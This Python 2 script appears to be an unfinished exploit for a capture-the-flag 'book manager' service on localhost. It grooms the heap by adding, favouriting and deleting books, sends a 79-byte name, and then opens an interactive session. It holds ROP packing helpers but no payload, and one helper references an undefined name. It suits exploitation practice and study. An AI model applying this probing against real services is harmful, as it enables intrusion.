#!/usr/bin/python
import random
import sys
import socket
import telnetlib
import os
import time
import threading
from struct import pack, unpack
from time import time

from keystone import *
from capstone import *
from unicorn import *

ks = Ks(KS_ARCH_X86, KS_MODE_64)
cs = Cs(CS_ARCH_X86, CS_MODE_64)
uc = Uc(UC_ARCH_X86, UC_MODE_64)


def recvuntil(sock, txt):
  d = ""
  while d.find(txt) == -1:
    try:
      dnow = sock.recv(1)
      if len(dnow) == 0:
        return ("DISCONNECTED", d)
    except socket.timeout:
      return ("TIMEOUT", d)
    except socket.error as msg:
      return ("ERROR", d)
    d += dnow
  return ("OK", d)

def recvall(sock, n):
  d = ""
  while len(d) != n:
    try:
      dnow = sock.recv(n - len(d))
      if len(dnow) == 0:
        return ("DISCONNECTED", d)
    except socket.timeout:
      return ("TIMEOUT", d)
    except socket.error as msg:
      return ("ERROR", d)
    d += dnow
  return ("OK", d)

# Proxy object for sockets.
class gsocket(object):
  def __init__(self, *p):
    self._sock = socket.socket(*p)

  def __getattr__(self, name):
    return getattr(self._sock, name)

  def recvall(self, n):
    err, ret = recvall(self._sock, n)
    if err != OK:
      return False
    return ret

  def recvuntil(self, txt):
    err, ret = recvuntil(self._sock, txt)
    if err != "OK":
      return False
    return ret

# Base for any of my ROPs.
def db(v):
  return pack("<B", v)

def dw(v):
  return pack("<H", v)

def dd(v):
  return pack("<I", v)

def dq(v):
  return pack("<Q", v)

def rb(v):
  return unpack("<B", v[0])[0]

def rw(v):
  return unpack("<H", v[:2])[0]

def rd(v):
  return unpack("<I", v[:4])[0]

def rq(v):
  return unpack("<Q", v[:8])[0]

def add_book(s, name, pages):
  s.sendall("1\n")
  s.sendall(name + "\n");
  s.sendall(str(pages) + "\n");

  print s.recvuntil("Added as ")
  idx = s.recvuntil("\n")
  print idx
  idx = int(idx)
  return idx

def delete_book(s, book_id):
  s.sendall("2\n")
  s.sendall(str(book_id) + "\n");

  print s.recvuntil("Removed.")

def list_books(s):
  s.sendall("3\n")

def add_fav(s, book_id):
  s.sendall("4\n")
  s.sendall(str(book_id) + "\n")

  print s.recvuntil("Added to favorites")

def list_fav(s):
  s.sendall("5\n")

def go():
  global HOST
  global PORT
  s = gsocket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((HOST, PORT))

  # Put your code here!

  print s.recvuntil("Choice? ")

  add_book(s, "A", 600)
  s.recvuntil("Choice? ")

  add_book(s, "B", 600)
  s.recvuntil("Choice? ")

  add_book(s, "C", 600)
  s.recvuntil("Choice? ")

  add_book(s, "D", 600)
  s.recvuntil("Choice? ")

  add_fav(s, 1)
  s.recvuntil("Choice? ")

  add_fav(s, 2)
  s.recvuntil("Choice? ")

  add_fav(s, 3)
  s.recvuntil("Choice? ")

  delete_book(s, 3)
  s.recvuntil("Choice? ")

  delete_book(s, 2)
  s.recvuntil("Choice? ")

  add_book(s, "A" * 79, 600)
  s.recvuntil("Choice? ")

  #list_fav(s)

  # Interactive sockets.
  t = telnetlib.Telnet()
  t.sock = s
  t.interact()

  # Python console.
  # Note: you might need to modify ReceiverClass if you want
  #       to parse incoming packets.
  #ReceiverClass(s).start()
  #dct = locals()
  #for k in globals().keys():
  #  if k not in dct:
  #    dct[k] = globals()[k]
  #code.InteractiveConsole(dct).interact()

  s.close()

HOST = '127.0.0.1'
PORT = 31337
go()


